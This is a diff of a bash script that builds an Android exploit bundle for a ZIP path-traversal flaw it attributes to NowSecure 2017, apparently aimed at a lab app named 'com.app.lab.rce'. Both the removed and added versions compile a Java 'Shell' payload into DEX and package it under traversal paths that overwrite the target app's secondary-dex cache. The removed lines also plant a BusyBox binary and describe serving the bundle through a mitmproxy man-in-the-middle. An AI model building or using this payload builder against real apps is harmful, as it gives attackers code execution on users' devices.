@@ -1,56 +1,73 @@
-#!/usr/bin/env bash
-# build_payload.sh  –  Genera exploit_bundle.zip con path-traversal (vector NowSecure)
+#!/bin/bash
+
+# NowSecure 2017 Vulnerability Exploit Builder
+# Creates malicious ZIP with path traversal entries
+
 set -e
 
-PKG="com.app.lab.rce"
-SDK="$HOME/Library/Android/sdk"
-JAR="$SDK/platforms/android-34/android.jar"
-D8="$SDK/build-tools/34.0.0/d8"
-OUT="payload/build"
-SRC="payload/src/pwn/Shell.java"
+echo "[+] Building NowSecure 2017 exploit payload..."
 
-[[ -f $JAR ]] || { echo "❌  android.jar no encontrado"; exit 1; }
-[[ -f $D8  ]] || { echo "❌  d8 no encontrado"; exit 1; }
+# Android SDK paths
+ANDROID_HOME="${ANDROID_HOME:-$HOME/Library/Android/sdk}"
+ANDROID_JAR="$ANDROID_HOME/platforms/android-34/android.jar"
+BUILD_TOOLS="$ANDROID_HOME/build-tools/34.0.0"
+D8="$BUILD_TOOLS/d8"
 
-mkdir -p "$OUT"
-
-echo "· Compilando Shell.java"
-javac -cp "$JAR" -d "$OUT" "$SRC"
-
-echo "· Generando classes.dex"
-"$D8" --lib "$JAR" --min-api 16 --output "$OUT" "$OUT/pwn/Shell.class"
-
-echo "· Empaquetando payload.zip"
-(cd "$OUT" && zip -q -j payload.zip classes.dex)
-
-if [[ ! -f "$OUT/busybox" ]]; then
-  echo "· Descargando BusyBox estático"
-  curl -sL -o "$OUT/busybox" \
-    https://busybox.net/downloads/binaries/1.35.0-aarch64-linux-musl/busybox
-  chmod +x "$OUT/busybox"
+if [ ! -f "$ANDROID_JAR" ]; then
+    echo "[-] Error: Android SDK not found at $ANDROID_JAR"
+    echo "    Please set ANDROID_HOME or install Android SDK"
+    exit 1
 fi
 
-echo "· Creando exploit_bundle.zip (path-traversal)"
-BUSYBOX_PATH=../../../../../../../../../../../../../../../../../../../../data/data/$PKG/files/busybox
-CLASSES_PATH=../../../../../../../../../../../../../../../../../../../../data/data/$PKG/code_cache/secondary-dexes/$PKG-classes2.zip
+if [ ! -f "$D8" ]; then
+    echo "[-] Error: d8 tool not found at $D8"
+    echo "    Please install Android build tools"
+    exit 1
+fi
 
-python3 - <<PY
-import zipfile, pathlib, sys
-out = zipfile.ZipFile("$OUT/exploit_bundle.zip", "w")
-info = zipfile.ZipInfo("$BUSYBOX_PATH");  info.external_attr = 0o100755 << 16
-out.writestr(info, open("$OUT/busybox","rb").read())
-info = zipfile.ZipInfo("$CLASSES_PATH");  info.external_attr = 0o100644 << 16
-out.writestr(info, open("$OUT/payload.zip","rb").read())
-out.close()
-print("✅ exploit_bundle.zip creado con path-traversal")
-PY
+# Clean previous builds
+rm -rf payload/bin exploit_bundle.zip
 
-echo
-echo "✅  Bundle listo: $OUT/exploit_bundle.zip"
-echo "➡  Copia a la carpeta mitmproxy y lanza:"
-echo "     cp $OUT/exploit_bundle.zip mitmproxy/"
-echo "     mitmproxy -s mitmproxy/offline_exploit.py -p 8090 &"
-echo
-echo "Luego configura el proxy en el emulador:"
-echo "     adb shell settings put global http_proxy 10.0.2.2:8090"
-echo "…y sigue los pasos habituales (instalar app, reiniciar, verificar)."
+# Compile Java payload
+echo "[+] Compiling Java payload..."
+mkdir -p payload/bin
+javac -cp "$ANDROID_JAR" -d payload/bin payload/src/pwn/Shell.java
+
+# Create DEX from compiled classes
+echo "[+] Creating DEX file..."
+cd payload/bin
+"$D8" --lib "$ANDROID_JAR" --min-api 16 --output . pwn/Shell.class
+
+# Create classes2.zip containing the DEX
+echo "[+] Creating classes2.zip..."
+zip -q classes2.zip classes.dex
+
+cd ../..
+
+# Create exploit bundle with path traversal entry
+echo "[+] Creating exploit bundle with path traversal..."
+python3 -c "
+import zipfile
+import os
+
+# Create the exploit bundle
+with zipfile.ZipFile('exploit_bundle.zip', 'w') as zf:
+    # Add the classes2.zip with path traversal name
+    path_traversal_name = '../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip'
+    zf.write('payload/bin/classes2.zip', path_traversal_name)
+
+print('[+] Path traversal entry added successfully')
+"
+
+# Verify exploit bundle
+if [ -f exploit_bundle.zip ]; then
+    SIZE=$(stat -f%z exploit_bundle.zip 2>/dev/null || stat -c%s exploit_bundle.zip)
+    echo "[+] Exploit bundle created: exploit_bundle.zip (${SIZE} bytes)"
+    echo "[+] Contents:"
+    unzip -l exploit_bundle.zip
+else
+    echo "[-] Error: exploit_bundle.zip not created"
+    exit 1
+fi
+
+echo "[+] Build complete!"
